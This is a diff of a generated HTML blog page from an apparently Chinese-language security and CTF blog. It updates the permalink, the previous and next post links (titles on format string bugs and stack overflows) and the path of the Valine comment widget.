@@ -476,7 +473,7 @@ ret = pop EIP</code></pre>
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/" title="PWN keep going">http://finsenty54.github.io/2020/11/10/PWN_keep_going/</a>
+      <a href="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/" title="Format string bug basic 1">http://finsenty54.github.io/2020/11/17/Format_string_bug_basic 1/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -511,14 +508,11 @@ ret = pop EIP</code></pre>
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/" rel="prev" title="ELF x64 - Nanomites - Introduction_WP">
-                  <i class="fa fa-chevron-left"></i> ELF x64 - Nanomites - Introduction_WP
+                <a href="/2020/11/14/Stack_buffer_overflow_basic_2/" rel="prev" title="Stack buffer overflow basic 2">
+                  <i class="fa fa-chevron-left"></i> Stack buffer overflow basic 2
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2020/11/13/google_ctf2020_RCE-beginner/" rel="next" title="google_ctf2020_RCE-beginner">
-                  google_ctf2020_RCE-beginner <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -652,7 +646,7 @@ NexT.utils.loadComments('#valine-comments', () => {
   NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
     new Valine(Object.assign({
       el  : '#valine-comments',
-      path: "/2020/11/10/PWN_keep_going/",
+      path: "/2020/11/17/Format_string_bug_basic%201/",
     }, {"enable":true,"appId":"3uGsbMNvxiG0LkbyciDSaxmY-MdYXbMMI","appKey":"1dU1y3SudPaV6pdTET96j5M2","placeholder":"欢迎交流讨论...","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
     ));
   }, window.Valine);
